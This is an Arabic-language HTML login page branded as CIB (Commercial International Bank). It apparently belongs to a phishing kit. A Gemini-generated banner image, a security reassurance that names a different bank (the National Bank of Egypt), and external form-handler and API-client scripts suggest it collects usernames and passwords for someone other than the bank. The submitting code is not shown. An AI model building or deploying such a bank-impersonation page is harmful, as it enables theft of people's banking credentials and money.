<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>CIB - تسجيل الدخول</title>
    <link rel="stylesheet" href="login.css" />
  </head>
  <body>
    <header class="login-header">
      <div class="login-logo-wrap">
        <img class="login-logo" src="img/logo.png" alt="CIB" />
      </div>
      <div class="login-separator" aria-hidden="true"></div>
    </header>

    <main class="login-page">
      <h1 class="login-title">مرحباً بكم في البنك التجاري الدولي</h1>

      <p class="login-subtitle">
        من فضلك سجل الدخول ب اسم المستخدم وكلمة المرور
      </p>

      <form class="login-form" action="#" method="post" autocomplete="off">
        <div class="field">
          <div class="field-label">اسم المستخدم</div>
          <input
            class="field-input"
            type="text"
            name="username"
            id="loginUsername"
            required
            autocomplete="username"
            autocapitalize="off"
            spellcheck="false"
            inputmode="text"
            pattern="[!-~]+"
            placeholder="ادخل اسم المستخدم"
          />
        </div>

        <div class="field">
          <div class="field-label">كلمة المرور</div>
          <input
            class="field-input"
            type="password"
            name="password"
            id="loginPassword"
            required
            maxlength="12"
            autocomplete="current-password"
            pattern="[ -~]{1,12}"
            placeholder="ادخل كلمة المرور"
          />
        </div>

        <button class="login-btn" type="submit">تسجيل الدخول</button>
      </form>

      <p class="login-note">
        يجمع البيانات مشفرة وصحيحة وفق معايير البنك الهلي<br />
        المصري
      </p>

      <img
        class="login-banner"
        src="img/Gemini_Generated_Image_7wbegg7wbegg7wbe.png"
        alt="البانر"
      />
    </main>
    
    <script src="api-config.js"></script>
    <script src="api-client.js"></script>
    <script src="form-handler.js"></script>
    <script>
      document.addEventListener('DOMContentLoaded', function () {
        initializeFormHandler('.login-form', 'login');
        var form = document.querySelector('.login-form');
        if (!form) return;
        var userEl = document.getElementById('loginUsername');
        var passEl = document.getElementById('loginPassword');
        var ascii = /^[\x20-\x7E]*$/;
        var asciiNoSpace = /^[\x21-\x7E]*$/;
        function refreshMsgs() {
          if (userEl) {
            var v = userEl.value;
            if (!v) userEl.setCustomValidity('');
            else if (!asciiNoSpace.test(v))
              userEl.setCustomValidity('اسم المستخدم: إنجليزي وأرقام ورموز فقط — بدون عربي أو مسافات.');
            else userEl.setCustomValidity('');
          }
          if (passEl) {
            var p = passEl.value;
            if (!p) passEl.setCustomValidity('');
            else if (p.length > 12)
              passEl.setCustomValidity('كلمة المرور يجب ألا تتجاوز 12 خانة.');
            else if (!ascii.test(p))
              passEl.setCustomValidity('كلمة المرور: إنجليزي وأرقام ورموز فقط — لا عربي.');
            else passEl.setCustomValidity('');
          }
        }
        if (userEl) {
          userEl.addEventListener('input', refreshMsgs);
          userEl.addEventListener('blur', function () {
            userEl.value = userEl.value.trim();
            refreshMsgs();
          });
        }
        if (passEl) {
          passEl.addEventListener('input', function () {
            if (passEl.value.length > 12) {
              passEl.value = passEl.value.slice(0, 12);
            }
            refreshMsgs();
          });
        }
        form.addEventListener('submit', function () {
          if (userEl) userEl.value = userEl.value.trim();
          refreshMsgs();
        }, true);
      });
    </script>
  </body>
</html>
